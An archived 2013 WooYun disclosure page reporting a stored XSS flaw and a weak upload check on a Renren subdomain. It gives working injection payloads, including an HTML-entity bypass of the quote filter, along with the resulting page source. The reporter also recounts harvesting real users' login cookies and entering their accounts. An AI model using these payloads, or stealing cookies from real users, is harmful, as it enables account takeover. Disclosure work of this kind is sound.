@@ -1,0 +1,222 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		人人网某分站储存型xss漏洞及上传问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		人人网某分站储存型xss漏洞及上传问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-08-02 07:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-22：	细节向普通白帽子公开<br/>
+									2013-09-01：	细节向实习白帽子公开<br/>
+									2013-09-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">晚上在人人网随便转了转，随手测试了下，发现人人网某分站存在储存型xss，可以盲打后台管理，也可以盗取他人登录cookie（已经证明）。上传位置也有些问题，我做了初步检测，你们自己仔细查查吧，请别给个位数的rank额。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1 存在漏洞的分站是这个：</p><pre><code>http://mentos.renren.com/</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/01222528ad2c91da07ec5d4d023db5f63c5208e9.png" target="_blank"><img src="../images/01222528ad2c91da07ec5d4d023db5f63c5208e9.png" alt="0.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2 上传作品，发现标题位置的字符会输出在js中。果断构造一下xss代码测试，xss代码：</p><pre><code>&#039;,(function(){alert(1)}()),&#039;</code></pre><p class='detail'>F12看了下源码，发现&#039;号被过滤成了′<br />
+<br />
+源码：</p><pre><code>&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;all_video_play(324,&#039;′,(function(){alert(1)}()),′&#039;,0,&#039;94678153&#039;,&#039;http://v139.56img.com/images/28/5/coop_3000002383i56olo56i56.com_cw_137535892041hd.jpg&#039;,&#039;u&#039;)&quot;&gt;&lt;img src=&quot;http://v139.56img.com/images/28/5/coop_3000002383i56olo56i56.com_cw_137535892041hd.jpg&quot; width=&quot;135&quot; height=&quot;100&quot; alt=&quot;&quot;&gt;&lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/01222632b1a7367b31c32f7bee3b63022e5a0dad.png" target="_blank"><img src="../images/01222632b1a7367b31c32f7bee3b63022e5a0dad.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3 将&#039;改为html的编码&amp;#39; 然后写入，xss代码为：</p><pre><code>&amp;#39;,(function(){alert(1)}()),&amp;#39;</code></pre><p class='detail'><br />
+<br />
+F12看一下，吼吼，成功解析了。<br />
+<br />
+源码</p><pre><code>：&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;all_video_play(325,&#039;&#039;,(function(){alert(1)}()),&#039;&#039;,0,&#039;http://yx.xnimg.cn/M04/22/1308/71/YJjIVnQrU36jai2aimQb63yi.ori.mp3&#039;,&#039;http://yx.xnimg.cn/M04/62/41/41/ZrIJ3yZrmE3ejaINBjAFvmYz.ori.jpg&#039;,&#039;m&#039;)&quot;&gt;&lt;img src=&quot;http://yx.xnimg.cn/M04/62/41/41/ZrIJ3yZrmE3ejaINBjAFvmYz.ori.jpg&quot; width=&quot;135&quot; height=&quot;100&quot; alt=&quot;&quot;&gt;&lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/01222715bc0cdda81cd0c968681cee8b028a78c8.png" target="_blank"><img src="../images/01222715bc0cdda81cd0c968681cee8b028a78c8.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4 点击一下试试，成功弹窗了。<br />
+<br />
+</p><p class="detail"><a href="../images/012241194fe7c72fac91e444a03f6c958f6a55c1.png" target="_blank"><img src="../images/012241194fe7c72fac91e444a03f6c958f6a55c1.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+5 尝试将&quot;&gt;&lt;也写成html的&amp;#模式，发现这里对于这三个字符会进行二次过滤，过滤为&amp;quot;&amp;gt;&amp;lt;<br />
+<br />
+源码：</p><pre><code>&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;all_video_play(326,&#039;&#039;)&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=alert(22)&amp;gt;&#039;,0,&#039;http://yx.xnimg.cn/M02/22/1308/79/Zzq6vyB7Rz2uUNN3Yf6RvuAr.ori.mp3&#039;,&#039;http://yx.xnimg.cn/M04/62/78/78/ym2emmbEB7niZNBnMbuyYfa2.ori.jpg&#039;,&#039;m&#039;)&quot;&gt;&lt;img src=&quot;http://yx.xnimg.cn/M04/62/78/78/ym2emmbEB7niZNBnMbuyYfa2.ori.jpg&quot; width=&quot;135&quot; height=&quot;100&quot; alt=&quot;&quot;&gt;&lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+6 测试一下有么有其他限制，能不能插入调用外部js文件的代码。结果表示无压力额~<br />
+<br />
+</p><p class="detail"><a href="../images/012229120595bf2e3d0a58b85919afe5a55f9d11.png" target="_blank"><img src="../images/012229120595bf2e3d0a58b85919afe5a55f9d11.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+7 可以写入盗取用户登录cookie的代码。虽然这里是点击型xss，但是中招率貌似还比较高，可能由于是点击播放视频或者音频的原因吧。吼吼，不一会就收到了几个，地址各异，不是很清楚中招的渠道都有哪些。<br />
+<br />
+</p><p class="detail"><a href="../images/01223021fa3614797adf1bc53011d3cd0d8794e6.png" target="_blank"><img src="../images/01223021fa3614797adf1bc53011d3cd0d8794e6.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/01223040889dc7f82f54a4be590df4867e1c2e14.png" target="_blank"><img src="../images/01223040889dc7f82f54a4be590df4867e1c2e14.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+8 测试cookie可以成功登录他人账户，并随意进行操作（请放心，我没有发布或者操作用户的任何东西）。<br />
+<br />
+</p><p class="detail"><a href="../images/01223103b2277c4c493ba12a2b920827de3722fe.png" target="_blank"><img src="../images/01223103b2277c4c493ba12a2b920827de3722fe.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/012231173448eb383d71f189eb67487bad910c0e.png" target="_blank"><img src="../images/012231173448eb383d71f189eb67487bad910c0e.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+管理员不知道是下班了还是比较聪明，我等了半个小时，管理的cookie也没弄到。可能因为我前面插了个alert(1)他发现后留意到了吧。不过根据我以前xss过那么多次人人网的经验，这里管理后台肯定是没有进行xss的二次过滤的。这里我也就不再等管理员cookie去登录后台截图了，反正这种后台应该也没啥东西。。<br />
+<br />
+<br />
+<br />
+9  这里的上传也有问题，图片位置和视频位置都可以传非法文件上去。我随便写了个txt，后缀改为xx.jpg  xx.mp3就直接给传上去了。。。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">请看上面详情。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1  对&#039;号进行二次过滤。<br />
+<br />
+2  上传位置判断做一下判断。<br />
+<br />
+<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033233" title="人人网某分站储存型xss漏洞及上传问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2013-08-02 16:21</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已修复，谢谢！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33233";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
